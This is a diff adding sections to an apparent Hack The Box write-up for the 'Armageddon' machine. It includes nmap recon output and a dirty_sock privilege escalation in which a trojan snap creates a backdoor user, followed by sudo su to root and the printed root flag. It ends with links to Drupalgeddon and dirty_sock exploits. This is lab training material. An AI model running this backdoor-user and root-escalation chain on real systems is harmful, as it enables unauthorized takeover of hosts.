@@ -27,8 +27,32 @@
 ## Nmap
 
 Recon host 10.10.10.233 with nmap. Add armageddon.htb to /etc/hosts
-```
 
+```
+┌──(root💀kali)-[/home/kali/HTB/armageddon]
+└─# nmap -sV -p- -sC 10.10.10.233
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 23:52 EDT
+Nmap scan report for armageddon.htb (10.10.10.233)
+Host is up (0.31s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1135.29 seconds
 ```
 
 Ports 80 and 22 are open 
@@ -426,8 +450,72 @@ And install trojan snap *pasha.snap*
 dirty-sock 0.1 installed
 ```
 
+And we get new user *dirty_sock*. 
 
+```
+[brucetherealadmin@armageddon tmp]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+dirty_sock:x:1001:1001::/home/dirty_sock:/bin/bash
+```
+
+Login with pass *dirty_sock*.
+This user can run every command with sudo privileges.
+Get root.txt
+
+```
+[brucetherealadmin@armageddon tmp]$ su dirty_sock
+Password: 
+[dirty_sock@armageddon tmp]$ id
+uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[dirty_sock@armageddon tmp]$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for dirty_sock: 
+Matching Defaults entries for dirty_sock on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User dirty_sock may run the following commands on armageddon:
+    (ALL : ALL) ALL
+[dirty_sock@armageddon tmp]$ sudo su
+[root@armageddon tmp]# cat ~/root.txt 
+330c849014f70b5f49124679801434fa
+```
 
 # Resources
 
+1. https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html
+2. https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
+3. https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html
+4. https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
+5. https://medium.com/@briskinfosec/drupal-core-remote-code-execution-vulnerability-cve-2019-6340-35dee6175afa
+6. https://github.com/pimps/CVE-2018-7600
+7. https://github.com/dreadlocked/Drupalgeddon2
 
